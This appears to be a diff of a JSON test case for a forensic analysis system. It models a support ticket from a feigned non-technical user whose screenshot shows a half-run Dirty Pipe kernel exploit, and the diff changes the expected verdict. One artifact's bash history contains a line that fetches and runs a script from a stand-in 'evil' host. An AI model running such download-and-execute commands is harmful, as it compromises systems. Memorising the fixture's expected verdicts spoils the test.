@@ -1,95 +1,98 @@
 {
-  "case_id": "case_084_cebo_falso_layman",
-  "name": "The False Layman Lure",
-  "description": "An 'admin' user submits a support ticket simulating digital incompetence. The attached screenshot shows a dirty pipe exploit half-executed. Zero probability of reaching that state accidentally.",
+  "_notes": [
+    "expected_verdict: MALICE→SUSPICION post-fix description/acquisition_assurance (cdeb32f). Sin acquisition metadata, evidencia blanda queda en SUSPICION. SUSPICION es epistemológicamente correcto para este esquema."
+  ],
   "artifacts": [
     {
       "artifact_id": "a084_01",
+      "description": "Ticket: 'I don't know what I touched, black screen with green text, can't open Excel'.",
       "evidence_type": "memory_process",
-      "source_tool": "sift_ticket_system",
-      "timestamp": "2026-01-16T09:15:22Z",
-      "raw_score": 0.92,
+      "metadata": {
+        "attachment_count": 1,
+        "process_creation_time": "2026-04-10T09:10:00Z",
+        "ticket_id": "SUP-2026-084",
+        "user_department": "administracion"
+      },
       "prior_trust": 0.3,
       "provenance_chain": [
         "sha256:a084tick01"
       ],
-      "description": "Ticket: 'I don't know what I touched, black screen with green text, can't open Excel'.",
-      "metadata": {
-        "ticket_id": "SUP-2026-084",
-        "user_department": "administracion",
-        "attachment_count": 1,
-        "process_creation_time": "2026-04-10T09:10:00Z"
-      }
+      "raw_score": 0.92,
+      "source_tool": "sift_ticket_system",
+      "timestamp": "2026-01-16T09:15:22Z"
     },
     {
       "artifact_id": "a084_02",
+      "description": "Attached screenshot: Linux terminal with CVE-2022-0847 (dirty pipe) half-executed. Progress bar visible at 45%.",
       "evidence_type": "memory_process",
-      "source_tool": "sift_vision_ocr",
-      "timestamp": "2026-01-16T09:16:10Z",
-      "raw_score": 0.92,
+      "metadata": {
+        "exploit_stage": "privilege escalation preparation",
+        "filename": "screenshot.png",
+        "ocr_text": "[sudo] password for admin: ██████ 45%",
+        "technical_literacy_required": "advanced C programming"
+      },
       "prior_trust": 0.7,
       "provenance_chain": [
         "sha256:a084img02"
       ],
-      "description": "Attached screenshot: Linux terminal with CVE-2022-0847 (dirty pipe) half-executed. Progress bar visible at 45%.",
-      "metadata": {
-        "filename": "screenshot.png",
-        "ocr_text": "[sudo] password for admin: ██████ 45%",
-        "exploit_stage": "privilege escalation preparation",
-        "technical_literacy_required": "advanced C programming"
-      }
+      "raw_score": 0.92,
+      "source_tool": "sift_vision_ocr",
+      "timestamp": "2026-01-16T09:16:10Z"
     },
     {
       "artifact_id": "a084_03",
-      "evidence_type": "memory_process",
-      "source_tool": "sift_volatility",
-      "timestamp": "2026-01-16T09:16:30Z",
-      "raw_score": 0.9,
-      "prior_trust": 0.95,
-      "provenance_chain": [
-        "sha256:a084mem03"
-      ],
       "description": "Bash history in memory: wget exploit.sh && chmod +x && ./exploit.sh.",
+      "evidence_type": "memory_process",
       "metadata": {
-        "pid": 3101,
         "bash_history": [
           "wget http://evil/exploit.sh",
           "chmod +x exploit.sh",
           "./exploit.sh"
-        ]
-      }
+        ],
+        "pid": 3101
+      },
+      "prior_trust": 0.95,
+      "provenance_chain": [
+        "sha256:a084mem03"
+      ],
+      "raw_score": 0.9,
+      "source_tool": "sift_volatility",
+      "timestamp": "2026-01-16T09:16:30Z"
     },
     {
       "artifact_id": "a084_04",
+      "description": "DNS resolution to a domain registered 2 days before the support ticket.",
       "evidence_type": "dns_record",
-      "source_tool": "sift_pcap",
-      "timestamp": "2026-01-16T09:14:00Z",
-      "raw_score": 0.6,
+      "metadata": {
+        "domain": "update-helpdesk[.]net",
+        "network_log_time": "2026-04-10T09:15:00Z",
+        "registration_date": "2026-01-14",
+        "resolver": "8.8.8.8"
+      },
       "prior_trust": 0.5,
       "provenance_chain": [
         "sha256:a084dns04"
       ],
-      "description": "DNS resolution to a domain registered 2 days before the support ticket.",
-      "metadata": {
-        "domain": "update-helpdesk[.]net",
-        "registration_date": "2026-01-14",
-        "resolver": "8.8.8.8",
-        "network_log_time": "2026-04-10T09:15:00Z"
-      }
+      "raw_score": 0.6,
+      "source_tool": "sift_pcap",
+      "timestamp": "2026-01-16T09:14:00Z"
     }
   ],
   "caie_fractures": [
     {
-      "type": "COMPETENCE_THEATER",
+      "description": "Zero probability that a non-technical user accidentally reaches a kernel exploit execution state.",
       "severity": 0.99,
-      "description": "Zero probability that a non-technical user accidentally reaches a kernel exploit execution state."
+      "type": "COMPETENCE_THEATER"
     }
   ],
-  "expected_verdict": "MALICE",
+  "case_id": "case_084_cebo_falso_layman",
+  "description": "An 'admin' user submits a support ticket simulating digital incompetence. The attached screenshot shows a dirty pipe exploit half-executed. Zero probability of reaching that state accidentally.",
+  "expected_verdict": "SUSPICION",
+  "name": "The False Layman Lure",
+  "notes": "Forensic theater: the law of chance does not generate kernel exploits from 'clicking around'.",
   "peirce_chain": {
     "firstness": "Non-technical user ticket with a Linux terminal screenshot.",
     "secondness": "A 'non-technical' user cannot accidentally reach a kernel exploit execution state.",
     "thirdness": "Habit of using simulated incompetence to induce privileged action from the support technician."
-  },
-  "notes": "Forensic theater: the law of chance does not generate kernel exploits from 'clicking around'."
+  }
 }
